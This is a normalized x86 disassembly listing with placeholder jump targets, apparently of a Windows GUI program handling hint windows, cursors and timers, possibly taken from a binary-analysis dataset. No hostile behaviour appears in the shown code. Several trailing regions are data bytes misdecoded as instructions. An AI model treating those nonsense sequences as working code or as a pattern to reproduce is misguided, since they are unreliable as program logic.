cmp [ ebx + 0x48 ] 0x0
je r-xdata
cmp esi [ ebx + 0x48 ]
jne r-xdata
push 0x0
xor ecx ecx
mov edx 0xb014
mov eax [ ebx + 0x48 ]
call sub_43e0d4
test esi esi
je r-xdata
test esi esi
je r-xdata
cmp esi [ ebx + 0x48 ]
jne r-xdata
push 0x0
xor ecx ecx
mov edx 0xb013
mov eax [ ebx + 0x48 ]
call sub_43e0d4
sub_45d28c
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_45d39c
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_45d214
mov ebx eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x88 ] 0x0
je r-xdata
lea edx [ ebp - 0x10 ]
mov eax ebx
call sub_45b2c4
mov eax [ ebp - 0x10 ]
lea edx [ ebp - 0xc ]
call sub_43a030
mov edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_45d44c
mov [ ebp - 0x5 ] 0x1
xor eax eax
push ebp
push sub_45d343
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x102 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x48 ] 0x0
jne r-xdata
cmp [ ebp - 0x5 ] 0x0
je r-xdata
lea ecx [ ebp - 0x5 ]
mov ebx [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x104 ]
call [ ebx + 0x100 ]
mov eax [ ebp - 0x4 ]
call sub_45d7e4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_45d1b0
call GetCurrentThreadId
mov edx [ rw-data ]
cmp eax [ edx ]
jne r-xdata
cmp [ ebp - 0x5 ] 0x0
je r-xdata
xor eax eax
call sub_41988c
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45d3a3
lea eax [ ebp - 0x10 ]
mov edx 0x2
call sub_403fcc
retn
call WaitMessage
mov [ ebp - 0x5 ] 0x0
sub_45d3ac
push ebx
push esi
push edi
mov edi edx
mov eax [ rw-data ]
call sub_45a740
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
pop edi
pop esi
pop ebx
retn
inc ebx
xor esi esi
push 0x0
mov edx esi
mov eax [ rw-data ]
call sub_45a72c
movzx edx di
xor ecx ecx
call sub_43e0d4
inc esi
dec ebx
jne r-xdata
sub_45d3e8
push ebx
mov ebx eax
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
mov eax [ ebx + 0x30 ]
push eax
call IsIconic
test eax eax
je r-xdata
mov eax ebx
call sub_45c504
push eax
push 0x1
push 0x80
mov eax [ ebx + 0x30 ]
push eax
call SendMessageA
mov eax ebx
call sub_45c504
push eax
push 0xfffffff2
mov eax [ ebx + 0x30 ]
push eax
call SetClassLongA
jmp r-xdata
mov dx 0xb01d
mov eax ebx
call sub_45d3ac
pop ebx
retn
push 0xffffffff
push 0x0
mov eax [ ebx + 0x30 ]
push eax
call InvalidateRect
sub_45d44c
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x54 ]
mov edx esi
call sub_4043b4
je r-xdata
pop esi
pop ebx
pop ecx
pop ebp
retn
lea eax [ ebx + 0x54 ]
mov edx esi
call sub_403ffc
cmp [ ebx + 0xfa ] 0x0
je r-xdata
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_4367f0
mov [ ebp - 0x4 ] eax
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_449724
xor eax eax
push ebp
push sub_45d4d1
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov si 0xffef
call sub_403454
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_403258
retn
mov edx ebx
mov eax [ ebx + 0xfc ]
call [ ebx + 0xf8 ]
jmp r-xdata
sub_45d4e0
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call IsWindowVisible
cmp eax 0x1
sbb eax eax
inc eax
cmp al [ rw-data ]
jne r-xdata
pop ebx
pop ebp
retn
cmp bl [ rw-data ]
je r-xdata
xor eax eax
mov al bl
movzx eax [ eax * 2 + rw-data ]
push eax
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call SetWindowPos
mov [ rw-data ] bl
sub_45d53c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ rw-data ]
call sub_45a740
mov esi eax
dec esi
test esi esi
jl r-xdata
push ebp
xor eax eax
call sub_45d4e0
pop ecx
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
cmp [ ebx + 0x190 ] 0x0
je r-xdata
mov edx edi
mov eax [ rw-data ]
call sub_45a72c
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
je r-xdata
push ebp
mov al 0x1
call sub_45d4e0
pop ecx
jmp r-xdata
mov eax ebx
call sub_443a0c
test al al
jne r-xdata
mov eax [ ebx + 0x190 ]
push eax
mov eax ebx
call sub_443708
push eax
call IsChild
test eax eax
jne r-xdata
sub_45d5c4
push ebx
push esi
mov esi eax
xor ebx ebx
cmp [ esi + 0x4c ] 0x0
jne r-xdata
cmp [ esi + 0x4c ] 0x0
je r-xdata
lea eax [ esi + 0x4c ]
call sub_4056c4
call sub_4252a4
mov eax ebx
pop esi
pop ebx
retn
mov bl 0x1
sub_45d5ec
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
mov eax edi
call sub_45d630
push sub_45b31c
push esi
push 0x0
push 0x0
call SetTimer
mov [ edi + 0x8a ] ax
mov [ edi + 0x89 ] bl
cmp [ edi + 0x8a ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_45d7e4
sub_45d658
push ebx
push esi
push edi
push ebp
add esp 0xffffffe0
mov ebp ecx
mov edi edx
mov esi eax
lea edx [ esp + 0x18 ]
mov eax [ ebp + 0x8 ]
call sub_4069fc
lea edx [ esp + 0x18 ]
lea ecx [ esp + 0x10 ]
mov eax edi
call sub_43ca38
lea eax [ esp + 0x10 ]
mov dl 0x1
call sub_43b7cc
call sub_45b2fc
mov ebx eax
test ebx ebx
je r-xdata
mov eax esi
call sub_45d7e4
jmp r-xdata
cmp [ ebx + 0x99 ] 0x0
jne r-xdata
add esp 0x20
pop ebp
pop edi
pop esi
pop ebx
retn
cmp ebx [ esi + 0x60 ]
jne r-xdata
mov al [ esi + 0x58 ]
mov [ esp + 0x4 ] al
cmp [ esp + 0x4 ] 0x0
je r-xdata
lea edx [ esp + 0x18 ]
mov eax [ ebp + 0x8 ]
call sub_4069fc
lea edx [ esp + 0x18 ]
lea ecx [ esp + 0x10 ]
mov eax edi
call sub_43ca38
push [ esp + 0x14 ]
push [ esp + 0x14 ]
lea eax [ esi + 0x64 ]
push eax
call PtInRect
test eax eax
jne r-xdata
mov eax [ esi + 0x78 ]
mov [ esp ] eax
mov eax [ esi + 0x80 ]
mov [ esp ] eax
jmp r-xdata
mov eax esi
call sub_45d7e4
mov al [ esp + 0x4 ]
mov [ esi + 0x58 ] al
mov [ esi + 0x60 ] ebx
xor ecx ecx
mov edx [ esp ]
mov eax esi
call sub_45d5ec
cmp [ esp ] 0x0
jne r-xdata
mov eax esp
push eax
xor ecx ecx
mov cl [ esp + 0x8 ]
mov edx 0xb041
mov eax ebx
call sub_43e0d4
cmp [ esp + 0x4 ] 0x0
je r-xdata
mov al [ esp + 0x4 ]
mov [ esi + 0x58 ] al
mov [ esi + 0x60 ] ebx
lea eax [ esp + 0x5 ]
push eax
call GetCursorPos
lea edx [ esp + 0x5 ]
mov eax esi
call sub_45da7c
jmp r-xdata
sub_45d768
push ebx
add esp 0xfffffff8
mov ebx eax
mov eax ebx
call sub_45d630
mov al [ ebx + 0x89 ]
sub al 0x1
jb r-xdata
push esp
call GetCursorPos
mov edx esp
mov eax ebx
call sub_45da7c
jne r-xdata
pop ecx
pop edx
pop ebx
retn
mov eax ebx
call sub_45d7a0
jmp r-xdata
sub_45d7a0
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x84 ]
test esi esi
je r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_443a0c
test al al
je r-xdata
mov eax [ ebx + 0x84 ]
call sub_443708
push eax
call IsWindowVisible
test eax eax
je r-xdata
push 0x0
mov eax [ ebx + 0x84 ]
call sub_443708
push eax
call ShowWindow
sub_45d7e4
push ebx
mov ebx eax
cmp [ ebx + 0x60 ] 0x0
je r-xdata
pop ebx
retn
mov eax ebx
call sub_45d7a0
xor eax eax
mov [ ebx + 0x60 ] eax
mov [ ebx + 0x58 ] 0x0
call sub_45b484
mov eax ebx
call sub_45d630
sub_45d81c
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
push edi
push 0xe
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x28 ]
push eax
call GetCursor
push eax
call GetIconInfo
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
xor edx edx
push ebp
push sub_45d95e
push [ fs : edx ]
mov [ fs : edx ] esp
lea ecx [ ebp - 0xc ]
lea edx [ ebp - 0x8 ]
mov eax [ ebp - 0x1c ]
call sub_41efcc
mov eax [ ebp - 0x8 ]
add eax [ ebp - 0xc ]
call sub_407b7c
mov [ ebp - 0x10 ] eax
xor edx edx
push ebp
push sub_45d92f
push [ fs : edx ]
mov [ fs : edx ] esp
mov ebx [ ebp - 0x10 ]
add ebx [ ebp - 0x8 ]
push ebx
mov esi [ ebp - 0x10 ]
mov ecx esi
xor edx edx
mov eax [ ebp - 0x1c ]
call sub_41f084
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45d936
mov edx [ ebp - 0x8 ]
add edx [ ebp - 0xc ]
mov eax [ ebp - 0x10 ]
call sub_4026dc
retn
mov eax [ ebp - 0x10 ]
cmp [ eax + 0xe ] 0x1
jne r-xdata
mov eax [ esi + 0x4 ]
mov edx eax
movzx ecx [ esi + 0xe ]
imul edx ecx
add edx 0x1f
and edx 0xffffffe0
test edx edx
jns r-xdata
sar edx 0x3
mov [ ebp - 0x14 ] edx
mov edi eax
imul edi [ ebp - 0x14 ]
add ebx [ ebp - 0xc ]
sub ebx edi
mov ecx 0xff
mov edx edi
mov eax ebx
call sub_45d80c
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
add edx 0x7
mov eax [ ebp - 0x4 ]
cdq
idiv [ ebp - 0x14 ]
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x20 ]
sub [ ebp - 0x4 ] eax
mov eax [ esi + 0x8 ]
mov edx [ esi + 0x4 ]
add edx edx
cmp eax edx
jl r-xdata
mov eax ebx
sub eax edi
xor ecx ecx
mov edx edi
call sub_45d80c
mov [ ebp - 0x4 ] eax
sub_45d936
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x18 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x1c ]
test eax eax
je r-xdata
push eax
call DeleteObject
retn
push eax
call DeleteObject
sub_45d970
push ebp
mov ebp esp
push ebx
push esi
mov ebx eax
test ebx ebx
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov esi [ eax + 0x84 ]
test esi esi
je r-xdata
mov ebx [ rw-data ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x84 ]
call sub_403258
mov eax [ ebp + 0x8 ]
mov ecx [ eax - 0x4 ]
mov dl 0x1
mov eax ebx
call [ eax + 0x2c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov [ edx + 0x84 ] eax
mov eax [ ebp + 0x8 ]
mov eax esi
call sub_4031a0
cmp ebx eax
je r-xdata
pop esi
pop ebx
pop ebp
retn
sub_45d9d0
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
xor edx edx
mov [ ebp - 0x8 ] edx
xor edx edx
push ebp
push sub_45da6a
push [ fs : edx ]
mov [ fs : edx ] esp
xor edx edx
mov [ ebp - 0x4 ] edx
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45da71
lea eax [ ebp - 0x8 ]
call sub_403fa8
retn
jmp r-xdata
cmp [ ebx ] 0x0
jne r-xdata
mov esi ebx
jmp r-xdata
mov al [ ebx ]
test al al
je r-xdata
mov ecx ebx
sub ecx esi
lea eax [ ebp - 0x8 ]
mov edx esi
call sub_404098
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x84 ]
mov eax [ eax + 0x208 ]
mov edx [ ebp - 0x8 ]
call sub_41db8c
cmp eax [ ebp - 0x4 ]
jle r-xdata
sub al 0xa
je r-xdata
cmp [ ebx ] 0xd
jne r-xdata
mov [ ebp - 0x4 ] eax
sub al 0x3
jne r-xdata
cmp [ ebx ] 0xa
jne r-xdata
inc ebx
mov eax ebx
call sub_40c2dc
mov ebx eax
inc ebx
sub_45da7c
push ebp
mov ebp esp
add esp 0xffffff70
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8c ] ecx
mov [ ebp - 0x90 ] ecx
mov esi edx
lea edi [ ebp - 0xc ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x60 ]
mov edx [ r-xdata ]
call sub_404914
lea ebx [ ebp - 0x4 ]
xor eax eax
push ebp
push sub_45de02
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx ]
mov [ eax + 0x58 ] 0x0
mov eax [ ebx ]
cmp [ eax + 0x88 ] 0x0
je r-xdata
mov eax [ ebp - 0x30 ]
test eax eax
jle r-xdata
mov eax [ ebx ]
cmp [ eax + 0x60 ] 0x0
je r-xdata
mov eax [ ebx ]
call sub_45d7e4
xor ecx ecx
mov edx eax
mov eax [ ebx ]
call sub_45d5ec
jmp r-xdata
call sub_453cb4
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45de09
lea eax [ ebp - 0x90 ]
mov edx 0x2
call sub_403fcc
lea eax [ ebp - 0x60 ]
mov edx [ r-xdata ]
call sub_4049e4
retn
lea eax [ ebp - 0xc ]
mov dl 0x1
call sub_43b7cc
call sub_45b2fc
mov edx [ ebx ]
cmp eax [ edx + 0x60 ]
jne r-xdata
mov eax [ ebx ]
mov eax [ eax + 0x60 ]
mov [ ebp - 0x60 ] eax
mov eax [ ebp - 0xc ]
mov [ ebp - 0x58 ] eax
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x54 ] eax
call sub_45d81c
add [ ebp - 0x54 ] eax
mov eax [ rw-data ]
call sub_45a6c0
mov [ ebp - 0x50 ] eax
mov eax [ ebx ]
mov eax [ eax + 0x5c ]
mov [ ebp - 0x4c ] eax
lea edx [ ebp - 0x80 ]
mov eax [ ebx ]
mov eax [ eax + 0x60 ]
call sub_43c8c0
lea esi [ ebp - 0x80 ]
lea edi [ ebp - 0x48 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
lea edx [ ebp - 0x14 ]
mov eax [ ebx ]
mov eax [ eax + 0x60 ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
xor eax eax
mov [ ebp - 0x1c ] eax
xor eax eax
mov [ ebp - 0x18 ] eax
mov eax [ ebx ]
mov eax [ eax + 0x60 ]
mov esi [ eax + 0x30 ]
test esi esi
je r-xdata
mov eax [ ebx ]
mov esi [ eax + 0x60 ]
mov eax esi
mov edx [ r-xdata ]
call sub_4033e4
test al al
je r-xdata
lea edx [ ebp - 0x1c ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x40 ]
jmp r-xdata
mov eax [ ebp - 0x18 ]
sub eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0x1c ]
sub eax [ ebp - 0x14 ]
push eax
lea eax [ ebp - 0x48 ]
push eax
call OffsetRect
lea ecx [ ebp - 0x88 ]
lea edx [ ebp - 0xc ]
mov eax [ ebx ]
mov eax [ eax + 0x60 ]
call sub_43ca64
mov eax [ ebp - 0x88 ]
mov [ ebp - 0x38 ] eax
mov eax [ ebp - 0x84 ]
mov [ ebp - 0x34 ] eax
lea edx [ ebp - 0x90 ]
mov eax [ ebx ]
mov eax [ eax + 0x60 ]
call sub_45b2c4
mov eax [ ebp - 0x90 ]
lea edx [ ebp - 0x8c ]
call sub_439fec
mov edx [ ebp - 0x8c ]
lea eax [ ebp - 0x28 ]
call sub_404040
xor eax eax
mov [ ebp - 0x30 ] eax
mov eax [ ebx ]
mov eax [ eax + 0x74 ]
mov [ ebp - 0x2c ] eax
mov eax [ rw-data ]
mov [ ebp - 0x5c ] eax
xor eax eax
mov [ ebp - 0x24 ] eax
lea eax [ ebp - 0x60 ]
push eax
mov eax [ ebx ]
mov eax [ eax + 0x60 ]
xor ecx ecx
mov edx 0xb030
call sub_43e0d4
test eax eax
sete [ ebp - 0x1d ]
cmp [ ebp - 0x1d ] 0x0
je r-xdata
cmp [ esi + 0x190 ] 0x0
je r-xdata
cmp [ ebp - 0x1d ] 0x0
je r-xdata
mov eax [ ebx ]
cmp [ eax + 0x132 ] 0x0
je r-xdata
lea eax [ ebp - 0x1c ]
push eax
mov eax [ esi + 0x190 ]
push eax
call ClientToScreen
xor eax eax
jmp r-xdata
mov eax [ ebx ]
cmp [ eax + 0x60 ] 0x0
jne r-xdata
lea eax [ ebp - 0x60 ]
push eax
lea ecx [ ebp - 0x1d ]
lea edx [ ebp - 0x28 ]
mov esi [ ebx ]
mov eax [ esi + 0x134 ]
call [ esi + 0x130 ]
mov edx [ ebx ]
mov [ edx + 0x58 ] al
mov eax [ ebx ]
cmp [ eax + 0x58 ] 0x0
je r-xdata
mov al 0x1
cmp [ ebp - 0x28 ] 0x0
je r-xdata
push ebp
mov eax [ ebp - 0x5c ]
call sub_45d970
pop ecx
mov eax [ ebx ]
mov eax [ eax + 0x60 ]
mov dl [ eax + 0x5f ]
mov eax [ ebx ]
mov eax [ eax + 0x84 ]
mov ecx [ eax ]
call [ ecx + 0x70 ]
mov eax [ ebp - 0x24 ]
push eax
lea eax [ ebp - 0x70 ]
push eax
mov eax [ ebx ]
mov eax [ eax + 0x84 ]
mov ecx [ ebp - 0x28 ]
mov edx [ ebp - 0x50 ]
mov esi [ eax ]
call [ esi + 0xd8 ]
mov eax [ ebp - 0x54 ]
push eax
mov eax [ ebp - 0x58 ]
push eax
lea eax [ ebp - 0x70 ]
push eax
call OffsetRect
mov eax [ ebx ]
mov eax [ eax + 0x84 ]
mov si 0xffc8
call sub_403454
test al al
je r-xdata
lea ecx [ ebp - 0x88 ]
lea edx [ ebp - 0x48 ]
mov eax [ ebx ]
mov eax [ eax + 0x60 ]
call sub_43ca38
mov eax [ ebx ]
mov edx [ ebp - 0x88 ]
mov [ eax + 0x64 ] edx
mov edx [ ebp - 0x84 ]
mov [ eax + 0x68 ] edx
lea ecx [ ebp - 0x88 ]
lea edx [ ebp - 0x40 ]
mov eax [ ebx ]
mov eax [ eax + 0x60 ]
call sub_43ca38
mov eax [ ebx ]
mov edx [ ebp - 0x88 ]
mov [ eax + 0x6c ] edx
mov edx [ ebp - 0x84 ]
mov [ eax + 0x70 ] edx
mov eax [ ebx ]
mov eax [ eax + 0x84 ]
mov edx [ ebp - 0x4c ]
call sub_43d0c0
mov eax [ ebp - 0x24 ]
push eax
mov eax [ ebx ]
mov eax [ eax + 0x84 ]
mov ecx [ ebp - 0x28 ]
lea edx [ ebp - 0x70 ]
mov esi [ eax ]
call [ esi + 0xd4 ]
call sub_45b410
mov eax [ ebp - 0x30 ]
test eax eax
jle r-xdata
push ebp
mov eax [ ebp - 0x28 ]
call sub_45d9d0
pop ecx
add eax 0x5
sub [ ebp - 0x70 ] eax
sub [ ebp - 0x68 ] eax
mov cl 0x1
mov edx [ ebp - 0x2c ]
mov eax [ ebx ]
call sub_45d5ec
jmp r-xdata
xor ecx ecx
mov edx eax
mov eax [ ebx ]
call sub_45d5ec
jmp r-xdata
sub_45de10
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax [ rw-data ]
mov ebx [ eax + 0x68 ]
test ebx ebx
je r-xdata
mov eax edi
mov edx [ esi + 0x50 ]
call sub_403ffc
cmp [ ebx + 0x23c ] 0x0
je r-xdata
mov eax edi
mov edx [ ebx + 0x23c ]
call sub_403ffc
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_45de4c
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov ebx ecx
mov [ esp ] edx
mov esi eax
mov eax [ rw-data ]
mov edi [ eax + 0x6c ]
test edi edi
je r-xdata
mov ebp [ esi + 0x44 ]
cmp edi ebp
je r-xdata
push ebx
xor ecx ecx
mov edx [ esp + 0x4 ]
mov eax edi
call sub_43e0d4
dec eax
je r-xdata
xor eax eax
jmp r-xdata
test ebp ebp
je r-xdata
mov al 0x1
mov [ esp + 0x4 ] al
cmp [ esp + 0x4 ] 0x0
jne r-xdata
push ebx
xor ecx ecx
mov edx [ esp + 0x4 ]
mov eax ebp
call sub_43e0d4
dec eax
je r-xdata
mov al [ esp + 0x4 ]
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebx
mov edx [ r-xdata ]
call sub_4033e4
test al al
je r-xdata
cmp [ ebx + 0x6a ] 0x0
je r-xdata
cmp [ ebx + 0x60 ] 0x0
je r-xdata
cmp [ ebx + 0x42 ] 0x0
setne dl
mov eax ebx
call sub_4495ec
sub_45dedc
push ebx
push ecx
mov [ esp ] 0x0
cmp [ eax + 0xc2 ] 0x0
je r-xdata
mov al [ esp ]
pop edx
pop ebx
retn
mov ecx esp
mov ebx eax
mov eax [ ebx + 0xc4 ]
call [ ebx + 0xc0 ]
sub_45df04
push ebx
push ecx
mov [ esp ] 0x0
cmp [ eax + 0xca ] 0x0
je r-xdata
mov al [ esp ]
pop edx
pop ebx
retn
mov ecx esp
mov ebx eax
mov eax [ ebx + 0xcc ]
call [ ebx + 0xc8 ]
sub_45dfa8
add [ eax ] eax
add [ eax ] al
cmp al 0x2d
inc edi
add [ ebx + edx * 4 ] al
inc ebx
add [ eax ] al
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push sub_45e00b
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45e012
retn
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
call sub_453a60
mov eax sub_453ce0
call sub_413a78
mov eax [ rw-data ]
push eax
call CloseHandle
sub_45e057
add [ eax + 0x45 ] ah
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
movsb [ edi ] [ esi ]
loopne r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add cl ah
inc ebp
add [ eax + eax ] cl
add [ eax ] al
mov [ edi + 0x40 ] ch
add [ eax - 0x53ffbfcc ] ah
xor al 0x40
add [ eax - 0x4bffbfcc ] dh
xor al 0x40
add [ eax - 0xfffbfcc ] ch
xor [ eax ] eax
or al 0x32
inc eax
add [ eax + 0x32 ] cl
inc eax
add [ eax * 2 + 0x78456449 ] cl
arpl [ ebp + 0x70 ] sp
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
push 0x100045e1
add [ eax - 0x53ffbfcc ] ah
xor al 0x40
add [ eax - 0x4bffbfcc ] dh
xor al 0x40
add [ eax - 0xfffbfcc ] ch
xor [ eax ] eax
or al 0x32
inc eax
add [ eax + 0x32 ] cl
inc eax
add [ 0x49644945 ] dl
outsb
jbe r-xdata
loope r-xdata
outsd
outsb
lea eax [ eax ]
add cl ah
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
loope r-xdata
pop ebx
pop ebp
retn 0x4
jb r-xdata
inc ebp
dec ecx
push ebx
outsd
arpl [ ebx + 0x65 ] bp
je r-xdata
insb
imul esp [ ebx + edx * 2 + 0x65 ] 0x63697672
dec esi
popad
insd
mov eax eax
dec eax
xor al [ eax ]
js r-xdata
add [ eax ] al
add [ eax - 0x20 ] bl
inc ebp
add [ eax - 0x53ffbfcc ] ah
xor al 0x40
add [ eax - 0x4bffbfcc ] dh
xor al 0x40
add [ eax - 0xfffbfcc ] ch
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x1f ] ch
inc ebp
add [ eax ] dl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + eax ] cl
add [ eax ] al
pop eax
loopne r-xdata
push edi
cli
outsd
jb r-xdata
xor [ eax ] eax
or al 0x32
inc eax
add [ eax + 0x32 ] cl
inc eax
add [ eax - 0x1f ] bh
add [ esp + esi + 0x34b00040 ] ch
inc eax
add [ esp + esi + 0x34a80040 ] dh
inc eax
add al dh
inc ebp
add [ esi ] cl
sub_45e178
push ebp
mov ebp esp
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
mov ecx [ ebp + 0x8 ]
xor edx edx
mov eax edi
call sub_40b6f8
mov [ edi + 0xc ] esi
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_40357c
mov eax edi
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
call sub_4035d4
pop [ fs : 0x0 ]
add esp 0xc
sub_45e1c0
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_45e1e5
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45e1ec
retn
sub_45e1f8
push esi
inc edi
add cl bh
inc [ eax ]
add [ esi + edx * 2 + 0x47 ] ah
add dl bh
inc [ eax ]
add [ esi + edx * 2 + 0x47 ] ah
add bl bh
inc [ eax ]
add [ esi + edx * 2 + 0x47 ] ah
add ah bh
inc [ eax ]
add [ esi + edx * 2 + 0x47 ] ah
add ch bh
inc [ eax ]
add [ esi + edx * 2 + 0x47 ] ah
add dh bh
inc [ eax ]
add [ esi + edx * 2 + 0x47 ] ah
add bh bh
inc [ eax ]
add [ esi + edx * 2 + 0x47 ] ah
add al ah
inc [ eax ]
add [ esi + edx * 2 + 0x47 ] ah
add cl ah
inc [ eax ]
add [ esi + edx * 2 + 0x47 ] ah
add dl ah
inc [ eax ]
add [ esi + edx * 2 + 0x47 ] ah
add bl ah
inc [ eax ]
add [ esi + edx * 2 + 0x47 ] ah
add ah ah
inc [ eax ]
add [ esi + edx * 2 + 0x47 ] ah
add ch ah
inc [ eax ]
add [ esi + edx * 2 + 0x47 ] ah
add dh ah
inc [ eax ]
add [ esi + edx * 2 + 0x47 ] ah
add bh ah
inc [ eax ]
add [ esi + edx * 2 + 0x47 ] ah
add al ch
inc [ eax ]
add [ esi + edx * 2 + 0x47 ] ah
add cl ch
inc [ eax ]
add [ esi + edx * 2 + 0x47 ] ah
add dl ch
inc [ eax ]
add [ esi + edx * 2 + 0x47 ] ah
add bl ch
inc [ eax ]
add [ esi + edx * 2 + 0x47 ] ah
add ah ch
inc [ eax ]
add [ esi + edx * 2 + 0x47 ] ah
add ch ch
inc [ eax ]
add [ esi + edx * 2 + 0x47 ] ah
add dh ch
inc [ eax ]
add [ esi + edx * 2 + 0x47 ] ah
add bh ch
inc [ eax ]
add [ esi + edx * 2 + 0x47 ] ah
add al dl
inc [ eax ]
add [ esi + edx * 2 + 0x47 ] ah
add cl dl
inc [ eax ]
add [ esi + edx * 2 + 0x47 ] ah
add dl dl
inc [ eax ]
add [ esi + edx * 2 + 0x47 ] ah
add bl dl
inc [ eax ]
add [ esi + edx * 2 + 0x47 ] ah
add ah dl
inc [ eax ]
add [ esi + edx * 2 + 0x47 ] ah
add ch dl
inc [ eax ]
add [ esi + edx * 2 + 0x47 ] ah
add dh dl
inc [ eax ]
